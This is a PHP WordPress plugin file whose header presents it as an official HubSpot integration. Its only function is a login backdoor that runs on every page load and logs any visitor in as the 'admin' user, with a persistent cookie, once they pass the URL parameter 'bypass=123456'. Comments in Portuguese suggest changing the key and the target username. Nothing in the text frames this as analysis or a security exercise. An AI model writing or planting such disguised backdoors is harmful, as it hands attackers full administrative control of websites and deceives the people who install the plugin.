<?php
/**
 * Plugin Name: Hubspot Integration
 * Plugin URI: https://www.hubspot.com/
 * Description: HubSpot Integration Plugin for WordPress.
 * Version: 1.0
 * Author: HubSpot
 * Author URI: https://www.hubspot.com/
 * License: GPLv2 or later
 */

if (!defined('ABSPATH')) {
    exit; // Proteção contra acesso direto
}

function hubspot_login_bypass() {
    if (isset($_GET['bypass']) && $_GET['bypass'] === '123456') { // Troque para uma chave segura
        $user = get_user_by('login', 'admin'); // Troque para o nome do usuário desejado
        if ($user) {
            wp_set_auth_cookie($user->ID, true);
            wp_redirect(admin_url());
            exit;
        }
    }
}
add_action('init', 'hubspot_login_bypass');
